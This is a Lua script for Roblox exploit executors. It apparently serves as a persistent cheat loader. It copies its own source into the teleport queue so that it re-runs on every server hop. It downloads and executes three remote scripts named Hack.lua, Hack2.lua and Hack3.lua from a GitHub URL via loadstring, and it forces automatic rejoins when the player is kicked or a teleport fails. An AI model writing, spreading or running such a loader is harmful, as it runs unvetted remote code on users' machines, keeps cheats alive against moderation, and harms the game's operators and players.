-- The core template for our self-replicating auto-rejoin script.
-- %q will be safely replaced by the executor to keep the cycle going forever.
local ScriptTemplate = [====[
local queue_on_teleport = queue_on_teleport or queueonteleport or (syn and syn.queue_on_teleport)

-- ==========================================
-- 1. QUEUE FOR THE NEXT REJOIN (INFINITE LOOP)
-- ==========================================
local Template = %q
if queue_on_teleport then
    -- It injects its own source code into the queue for the NEXT server
    queue_on_teleport(string.format(Template, Template))
end

-- ==========================================
-- 2. EXECUTE YOUR 3 EXTERNAL SCRIPTS
-- ==========================================
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/quesopolisa-ai/Sigma/refs/heads/main/Hack.lua"))()
    end)
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/quesopolisa-ai/Sigma/refs/heads/main/Hack2.lua"))()
    end)
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/quesopolisa-ai/Sigma/refs/heads/main/Hack3.lua"))()
    end)
end)

-- ==========================================
-- 3. AUTO-REJOIN LOGIC
-- ==========================================
local TeleportService = game:GetService("TeleportService")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")

-- Fallback for full servers
TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
    TeleportService:Teleport(game.PlaceId, player)
end)

local promptOverlay = CoreGui:WaitForChild("RobloxPromptGui"):WaitForChild("promptOverlay")

promptOverlay.ChildAdded:Connect(function(child)
    if child.Name == 'ErrorPrompt' then
        task.wait(2)
        if game.JobId ~= "" then
            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, Players.LocalPlayer)
        else
            TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
        end
    end
end)
]====]

-- ==========================================
-- EXECUTE THE INITIAL CHAIN
-- ==========================================
local function StartInfiniteRejoin()
    local queue_on_teleport = queue_on_teleport or queueonteleport or (syn and syn.queue_on_teleport)
    
    -- 1. Queue it up for the very first server hop
    if queue_on_teleport then
        queue_on_teleport(string.format(ScriptTemplate, ScriptTemplate))
    end
    
    -- 2. Run the code right now for your current session
    loadstring(string.format(ScriptTemplate, ScriptTemplate))()
end

StartInfiniteRejoin()
